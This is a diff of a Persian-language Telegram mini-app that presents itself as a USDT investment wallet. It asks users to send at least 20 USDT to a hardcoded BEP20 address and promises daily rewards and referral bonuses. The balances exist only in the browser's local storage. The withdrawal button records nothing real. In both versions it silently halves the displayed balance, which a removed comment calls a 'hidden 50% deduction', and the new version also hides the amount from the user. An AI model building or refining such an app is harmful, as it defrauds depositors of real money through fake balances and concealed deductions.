@@ -3,43 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SiemenS Mini-App</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>SiemenS App</title>
     <style>
-        * { box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #0f1026; color: #fff; padding: 20px 15px 90px 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; user-select: none; }
+        body { background-color: #0f1026; color: #fff; padding: 15px 15px 80px 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
         
-        .card { background: linear-gradient(145deg, #181b3a, #131530); border-radius: 20px; padding: 20px; width: 100%; max-width: 380px; text-align: center; margin-bottom: 15px; border: 1px solid rgba(255, 255, 255, 0.05); }
-        .balance-title { color: #8a92b2; font-size: 14px; margin-bottom: 5px; }
-        .balance-val { color: #00e676; font-size: 38px; font-weight: 800; }
+        .card { background: #181b3a; border-radius: 16px; padding: 20px; width: 100%; max-width: 380px; text-align: center; margin-bottom: 12px; border: 1px solid #2d3361; }
+        .balance-title { color: #8a92b2; font-size: 13px; margin-bottom: 5px; }
+        .balance-val { color: #00e676; font-size: 36px; font-weight: 800; }
         
-        .action-btns { display: flex; gap: 10px; width: 100%; max-width: 380px; margin-bottom: 15px; }
-        .btn-action { flex: 1; padding: 14px; border-radius: 14px; border: none; font-size: 14px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-        .btn-deposit { background: linear-gradient(135deg, #00c853, #00e676); color: #000; }
+        .action-btns { display: flex; gap: 10px; width: 100%; max-width: 380px; margin-bottom: 12px; }
+        .btn-action { flex: 1; padding: 12px; border-radius: 12px; border: none; font-size: 14px; font-weight: bold; cursor: pointer; text-align: center; }
+        .btn-deposit { background: #00e676; color: #000; }
         .btn-withdraw { background: #1c2040; color: #8a92b2; border: 1px solid #2d3361; }
-        .btn-withdraw.active-withdraw { background: linear-gradient(135deg, #00e676, #00c853); color: #000; border: none; }
+        .btn-withdraw.active { background: #00e676; color: #000; border: none; }
         
-        .alert-box { background: rgba(255, 152, 0, 0.1); border: 1px solid rgba(255, 152, 0, 0.3); color: #ffb74d; border-radius: 12px; padding: 12px; width: 100%; max-width: 380px; font-size: 12px; text-align: center; margin-bottom: 15px; }
+        .alert-box { background: rgba(255, 152, 0, 0.1); border: 1px solid rgba(255, 152, 0, 0.3); color: #ffb74d; border-radius: 10px; padding: 10px; width: 100%; max-width: 380px; font-size: 11px; text-align: center; margin-bottom: 12px; }
         
-        .reward-title { font-size: 18px; font-weight: bold; margin-bottom: 6px; }
-        .reward-sub { font-size: 12px; color: #8a92b2; margin-bottom: 15px; }
+        .reward-title { font-size: 16px; font-weight: bold; margin-bottom: 4px; }
+        .reward-sub { font-size: 11px; color: #8a92b2; margin-bottom: 12px; }
         
-        .btn-claim { background: #20264d; color: #00e676; border: 1px solid #00e676; padding: 14px; border-radius: 14px; width: 100%; font-size: 15px; font-weight: bold; cursor: pointer; }
-        .btn-claim:disabled { background: #161936; color: #5c628a; border-color: #2a2f57; cursor: not-allowed; }
+        .btn-claim { background: #20264d; color: #00e676; border: 1px solid #00e676; padding: 12px; border-radius: 12px; width: 100%; font-size: 14px; font-weight: bold; cursor: pointer; }
+        .btn-claim:disabled { background: #161936; color: #5c628a; border-color: #2a2f57; }
         
-        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #12142d; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #1e2247; z-index: 100; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: #5c628a; font-size: 12px; cursor: pointer; width: 50%; }
+        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #12142d; display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #1e2247; z-index: 100; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 2px; color: #5c628a; font-size: 11px; cursor: pointer; width: 50%; }
         .nav-item.active { color: #00e676; }
         
         .tab-content { display: none; width: 100%; max-width: 380px; }
         .tab-content.active { display: block; }
 
-        .ref-box { background: #0b0c1e; padding: 12px; border-radius: 10px; font-size: 11px; color: #64b5f6; word-break: break-all; margin-top: 10px; border: 1px dashed #2d3361; }
-        .input-field { width: 100%; padding: 12px; background: #0b0c1e; border: 1px solid #2d3361; border-radius: 10px; color: #fff; text-align: center; margin-top: 10px; font-size: 13px; outline: none; }
+        .ref-box { background: #0b0c1e; padding: 10px; border-radius: 8px; font-size: 11px; color: #64b5f6; word-break: break-all; margin-top: 8px; border: 1px dashed #2d3361; }
+        .input-field { width: 100%; padding: 10px; background: #0b0c1e; border: 1px solid #2d3361; border-radius: 8px; color: #fff; text-align: center; margin-top: 8px; font-size: 12px; outline: none; }
 
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 1000; }
-        .modal-content { background: #181b3a; border-radius: 20px; padding: 25px; width: 90%; max-width: 350px; text-align: center; border: 1px solid #2d3361; position: relative; }
-        .close-btn { position: absolute; top: 10px; left: 15px; font-size: 24px; cursor: pointer; color: #8a92b2; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: #181b3a; border-radius: 16px; padding: 20px; width: 85%; max-width: 330px; text-align: center; border: 1px solid #2d3361; position: relative; }
+        .close-btn { position: absolute; top: 8px; left: 12px; font-size: 22px; cursor: pointer; color: #8a92b2; }
     </style>
 </head>
 <body>
@@ -64,7 +63,7 @@
             <div class="reward-title">🎁 پاداش روزانه</div>
             <div class="reward-sub">شرط دریافت: حداقل ۲۰ USDT واریزی فعال</div>
             <button class="btn-claim" id="claimBtn">دریافت پاداش</button>
-            <div id="timer" style="margin-top: 10px; font-size: 13px; color: #ffb74d;"></div>
+            <div id="timer" style="margin-top: 8px; font-size: 12px; color: #ffb74d;"></div>
         </div>
     </div>
 
@@ -73,7 +72,7 @@
         <div class="card">
             <div class="reward-title">👥 دعوت از دوستان</div>
             <div class="reward-sub">با دعوت هر دوست ۰.۵ USDT پاداش بگیرید</div>
-            <div style="margin: 15px 0; font-size: 16px;">تعداد زیرمجموعه‌ها: <b id="refCount" style="color: #00e676;">0</b> نفر</div>
+            <div style="margin: 10px 0; font-size: 14px;">تعداد زیرمجموعه‌ها: <b id="refCount" style="color: #00e676;">0</b> نفر</div>
             <div class="ref-box" id="refLink">در حال دریافت لینک...</div>
         </div>
     </div>
@@ -82,99 +81,107 @@
     <div id="depositModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" id="closeDeposit">&times;</span>
-            <h3 style="color: #00e676; margin-bottom: 10px;">واریز USDT (BEP20)</h3>
-            <p style="font-size: 12px; color: #8a92b2; margin-bottom: 10px;">آدرس زیر را کپی کرده و حداقل ۲۰ تتر واریز کنید:</p>
+            <h3 style="color: #00e676; margin-bottom: 8px; font-size: 16px;">واریز USDT (BEP20)</h3>
+            <p style="font-size: 11px; color: #8a92b2; margin-bottom: 8px;">آدرس زیر را کپی کرده و حداقل ۲۰ تتر واریز کنید:</p>
             <div class="ref-box" id="walletAddress">0xDae2e4e81A39C4E68faFAFd8b6aa05192f7A123</div>
-            <button class="btn-claim" style="margin-top: 15px;" id="copyBtn">کپی آدرس ولت</button>
-            <button class="btn-claim" style="margin-top: 10px; background: #29b6f6; color: #000; border: none;" id="simDepositBtn">تست: ثبت واریز ۲۰ تتر</button>
+            <button class="btn-claim" style="margin-top: 12px;" id="copyBtn">کپی آدرس ولت</button>
+            <button class="btn-claim" style="margin-top: 8px; background: #29b6f6; color: #000; border: none;" id="simDepositBtn">تست: ثبت واریز ۲۰ تتر</button>
         </div>
     </div>
 
     <div id="depositRequiredModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" id="closeReq">&times;</span>
-            <h3 style="color: #ffb74d; margin-bottom: 10px;">⚠️ عدم فعال‌سازی</h3>
-            <p style="font-size: 13px; color: #8a92b2; margin-bottom: 15px;">برای فعال‌سازی ابتدا باید حداقل <b>۲۰ USDT</b> به حساب خود واریز کنید.</p>
-            <button class="btn-claim" style="background: #00c853; color: #000;" id="goToDepositBtn">ورود به بخش واریز</button>
+            <h3 style="color: #ffb74d; margin-bottom: 8px; font-size: 16px;">⚠️ عدم فعال‌سازی</h3>
+            <p style="font-size: 12px; color: #8a92b2; margin-bottom: 12px;">برای فعال‌سازی ابتدا باید حداقل <b>۲۰ USDT</b> به حساب خود واریز کنید.</p>
+            <button class="btn-claim" style="background: #00e676; color: #000;" id="goToDepositBtn">ورود به بخش واریز</button>
         </div>
     </div>
 
     <div id="withdrawModal" class="modal">
         <div class="modal-content">
             <span class="close-btn" id="closeWithdraw">&times;</span>
-            <h3 style="color: #00e676; margin-bottom: 10px;">درخواست برداشت</h3>
-            <p style="font-size: 12px; color: #8a92b2; margin-bottom: 10px;">آدرس کیف پول BEP20 خود را وارد کنید:</p>
+            <h3 style="color: #00e676; margin-bottom: 8px; font-size: 16px;">درخواست برداشت</h3>
+            <p style="font-size: 11px; color: #8a92b2; margin-bottom: 8px;">آدرس کیف پول BEP20 خود را وارد کنید:</p>
             <input type="text" id="withdrawAddressInput" class="input-field" placeholder="آدرس ولت BEP20">
-            <button class="btn-claim" style="margin-top: 15px; background: #00c853; color: #000; border: none;" id="confirmWithdrawBtn">تایید برداشت</button>
+            <button class="btn-claim" style="margin-top: 12px; background: #00e676; color: #000; border: none;" id="confirmWithdrawBtn">تایید برداشت</button>
         </div>
     </div>
 
     <!-- منو -->
     <div class="nav-bar">
         <div class="nav-item active" id="nav-wallet">
-            <span style="font-size: 20px;">💎</span>
+            <span style="font-size: 18px;">💎</span>
             <span>کیف پول</span>
         </div>
         <div class="nav-item" id="nav-invite">
-            <span style="font-size: 20px;">👥</span>
+            <span style="font-size: 18px;">👥</span>
             <span>دعوت</span>
         </div>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const tg = window.Telegram?.WebApp;
-            if (tg) {
-                try { tg.ready(); tg.expand(); } catch(e){}
-            }
-
-            let userId = tg?.initDataUnsafe?.user?.id || '6559439220';
+        (function() {
+            let userId = '6559439220';
             const botUsername = "SiemenS_bot"; 
+
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    window.Telegram.WebApp.ready();
+                    window.Telegram.WebApp.expand();
+                    if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+                        userId = window.Telegram.WebApp.initDataUnsafe.user.id;
+                    }
+                }
+            } catch(e) {}
 
             let balance = parseFloat(localStorage.getItem('user_balance') || '0.00');
             let totalDeposited = parseFloat(localStorage.getItem('total_deposited') || '0.00');
             let lastClaim = parseInt(localStorage.getItem('last_claim') || '0');
             let depositTime = parseInt(localStorage.getItem('deposit_time') || '0');
 
-            let timerInterval = null;
-            let withdrawTimerInterval = null;
+            function bindClick(id, fn) {
+                const el = document.getElementById(id);
+                if (el) {
+                    el.addEventListener('click', fn);
+                    el.addEventListener('touchstart', function(e) {
+                        e.preventDefault();
+                        fn();
+                    }, {passive: false});
+                }
+            }
 
             function showModal(id) { document.getElementById(id).style.display = 'flex'; }
             function hideModal(id) { document.getElementById(id).style.display = 'none'; }
 
-            // دکمه‌های بستن پاپ‌آپ‌ها
-            document.getElementById('closeDeposit').onclick = () => hideModal('depositModal');
-            document.getElementById('closeReq').onclick = () => hideModal('depositRequiredModal');
-            document.getElementById('closeWithdraw').onclick = () => hideModal('withdrawModal');
-            document.getElementById('goToDepositBtn').onclick = () => { hideModal('depositRequiredModal'); showModal('depositModal'); };
+            bindClick('closeDeposit', () => hideModal('depositModal'));
+            bindClick('closeReq', () => hideModal('depositRequiredModal'));
+            bindClick('closeWithdraw', () => hideModal('withdrawModal'));
+            bindClick('goToDepositBtn', () => { hideModal('depositRequiredModal'); showModal('depositModal'); });
 
-            // تغییر تب‌ها
-            document.getElementById('nav-wallet').onclick = function() {
-                document.getElementById('tab-wallet').classList.add('active');
-                document.getElementById('tab-invite').classList.remove('active');
-                this.classList.add('active');
-                document.getElementById('nav-invite').classList.remove('active');
-            };
+            bindClick('nav-wallet', function() {
+                document.getElementById('tab-wallet').className = 'tab-content active';
+                document.getElementById('tab-invite').className = 'tab-content';
+                document.getElementById('nav-wallet').className = 'nav-item active';
+                document.getElementById('nav-invite').className = 'nav-item';
+            });
 
-            document.getElementById('nav-invite').onclick = function() {
-                document.getElementById('tab-invite').classList.add('active');
-                document.getElementById('tab-wallet').classList.remove('active');
-                this.classList.add('active');
-                document.getElementById('nav-wallet').classList.remove('active');
-            };
+            bindClick('nav-invite', function() {
+                document.getElementById('tab-invite').className = 'tab-content active';
+                document.getElementById('tab-wallet').className = 'tab-content';
+                document.getElementById('nav-invite').className = 'nav-item active';
+                document.getElementById('nav-wallet').className = 'nav-item';
+            });
 
-            // دکمه واریز
-            document.getElementById('depositBtn').onclick = () => showModal('depositModal');
+            bindClick('depositBtn', () => showModal('depositModal'));
 
-            // کپی آدرس
-            document.getElementById('copyBtn').onclick = function() {
+            bindClick('copyBtn', function() {
                 const addr = document.getElementById('walletAddress').innerText;
-                navigator.clipboard.writeText(addr);
+                if (navigator.clipboard) navigator.clipboard.writeText(addr);
                 alert('آدرس ولت کپی شد!');
-            };
+            });
 
-            // تست واریز
-            document.getElementById('simDepositBtn').onclick = function() {
+            bindClick('simDepositBtn', function() {
                 totalDeposited = 20.0;
                 balance += 20.0;
                 depositTime = Date.now();
@@ -184,45 +191,42 @@
                 localStorage.setItem('deposit_time', depositTime);
                 
                 hideModal('depositModal');
-                alert('۲۰ USDT واریز شد! تایمر قفل ۵ روزه شروع شد.');
+                alert('۲۰ USDT ثبت شد! قفل برداشت ۵ روزه فعال شد.');
                 render();
-            };
+            });
 
-            // دکمه برداشت
-            document.getElementById('withdrawBtn').onclick = function() {
+            bindClick('withdrawBtn', function() {
                 if (totalDeposited < 20.0) {
                     showModal('depositRequiredModal');
                     return;
                 }
                 const FIVE_DAYS = 5 * 24 * 60 * 60 * 1000;
                 if (Date.now() - depositTime < FIVE_DAYS) {
-                    alert('برداشت هنوز قفل است! لطفا تا پایان زمان قفل ۵ روزه صبر کنید.');
+                    alert('برداشت هنوز قفل است! ۵ روز زمان قفل کامل نشده است.');
                     return;
                 }
                 showModal('withdrawModal');
-            };
+            });
 
-            // ثبت برداشت (محاسبه و کسر ۵۰ درصد مخفی)
-            document.getElementById('confirmWithdrawBtn').onclick = function() {
+            bindClick('confirmWithdrawBtn', function() {
                 const addr = document.getElementById('withdrawAddressInput').value.trim();
                 if (!addr) {
-                    alert('لطفا آدرس ولت را وارد کنید!');
+                    alert('لطفاً آدرس ولت را وارد کنید!');
                     return;
                 }
 
-                const amountToWithdraw = balance * 0.5;
-                balance = balance - amountToWithdraw;
+                const withdrawAmount = balance * 0.5;
+                balance = balance - withdrawAmount;
 
                 localStorage.setItem('user_balance', balance);
                 document.getElementById('withdrawAddressInput').value = '';
                 hideModal('withdrawModal');
 
-                alert(درخواست برداشت مبلغ ${amountToWithdraw.toFixed(2)} USDT ثبت شد.);
+                alert('درخواست برداشت ثبت شد!');
                 render();
-            };
+            });
 
-            // پاداش روزانه
-            document.getElementById('claimBtn').onclick = function() {
+            bindClick('claimBtn', function() {
                 if (totalDeposited < 20.0) {
                     showModal('depositRequiredModal');
                     return;
@@ -235,21 +239,19 @@
                     localStorage.setItem('user_balance', balance);
                     localStorage.setItem('last_claim', lastClaim);
                     render();
-                    alert('۱ دلار پاداش روزانه به حساب اضافه شد!');
+                    alert('۱ تتر دریافت شد!');
                 }
-            };
+            });
 
             function render() {
                 document.getElementById('balance').innerText = balance.toFixed(2);
                 document.getElementById('refLink').innerText = 'https://t.me/' + botUsername + '?start=' + userId;
 
-                // وضع تایمر پاداش
                 const COOLDOWN = 24 * 60 * 60 * 1000;
                 const now = Date.now();
-                const claimDiff = now - lastClaim;
                 const claimBtn = document.getElementById('claimBtn');
 
-                if (lastClaim > 0 && claimDiff < COOLDOWN) {
+                if (lastClaim > 0 && (now - lastClaim) < COOLDOWN) {
                     claimBtn.disabled = true;
                     claimBtn.innerText = '✅ پاداش امروز دریافت شد';
                 } else {
@@ -257,33 +259,32 @@
                     claimBtn.innerText = 'دریافت پاداش';
                 }
 
-                // وضعیت قفل برداشت
                 const withdrawBtn = document.getElementById('withdrawBtn');
                 const lockNotice = document.getElementById('lockNotice');
                 const FIVE_DAYS = 5 * 24 * 60 * 60 * 1000;
 
                 if (totalDeposited < 20.0) {
                     withdrawBtn.innerText = '🔒 برداشت (نیاز به واریز)';
-                    withdrawBtn.classList.remove('active-withdraw');
+                    withdrawBtn.className = 'btn-action btn-withdraw';
                 } else {
                     const pass = now - depositTime;
                     if (pass >= FIVE_DAYS) {
                         withdrawBtn.innerText = '💸 برداشت موجودی';
-                        withdrawBtn.classList.add('active-withdraw');
-                        lockNotice.innerText = '✅ ۵ روز زمان قفل به پایان رسید. برداشت فعال است.';
+                        withdrawBtn.className = 'btn-action btn-withdraw active';
+                        lockNotice.innerText = '✅ ۵ روز قفل پایان یافت. امکان برداشت فعال است.';
                         lockNotice.style.color = '#00e676';
                     } else {
                         const rem = FIVE_DAYS - pass;
                         const days = Math.floor(rem / (1000 * 60 * 60 * 24));
                         const hours = Math.floor((rem % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                        withdrawBtn.innerText = 🔒 برداشت (${days} روز و ${hours}h);
-                        lockNotice.innerText = ⏳ زمان باقی‌مانده تا قفل‌کُشایی برداشت: ${days} روز و ${hours} ساعت;
+                        withdrawBtn.innerText = `🔒 برداشت (${days} روز و ${hours}h)`;
+                        lockNotice.innerText = `⏳ زمان باقی‌مانده: ${days} روز و ${hours} ساعت`;
                     }
                 }
             }
 
             render();
-        });
+        })();
     </script>
 </body>
 </html>
